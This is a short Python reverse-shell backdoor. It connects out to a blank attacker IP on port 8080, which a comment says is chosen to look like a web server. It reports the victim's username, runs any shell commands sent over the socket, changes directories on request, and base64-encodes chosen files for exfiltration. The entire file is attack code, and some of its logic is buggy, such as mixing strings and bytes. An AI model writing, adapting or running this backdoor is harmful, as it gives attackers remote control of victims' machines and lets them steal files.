import socket
import subprocess
import json
import os
import base64

ip = ""
port = 8080  # 8080 / 80 to look like a web server

user = subprocess.check_output("whoami", shell=True).decode()


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((ip, port))

connection.send(f"\nSuccessfully connected to {user}\n")


def cmd_exec(command):
    return subprocess.check_output(command, shell=True)


def send_j(pack):
    package = json.dumps(pack)
    connection.send(package)


def recv_j():
    data = ""

    while True:
        try:
            data += connection.recv(2048)
            return json.loads(data)
        except ValueError:
            continue


def down_func(file):
    with open(file, "rb") as last:
        return base64.b64encode(last.read())


try:
    while True:
        cmd1 = recv_j()
        cmd_out = cmd_exec(cmd1)

        if cmd1[0] == "exit":
            connection.close()
            break

        elif cmd1[0] == "cd" and cmd1[1]:
            os.chdir(cmd1[1])
            cmd_out = f"{os.getcwd()}$ "

        elif cmd1[0] == "download" and cmd1[1]:
            cmd_out = down_func(cmd1[1])

        else:
            send_j(f"{user}: " + cmd_out)

        send_j(f"{user}: " + cmd_out)

    connection.close()

except KeyboardInterrupt:
    print("Exiting..")
    exit(0)
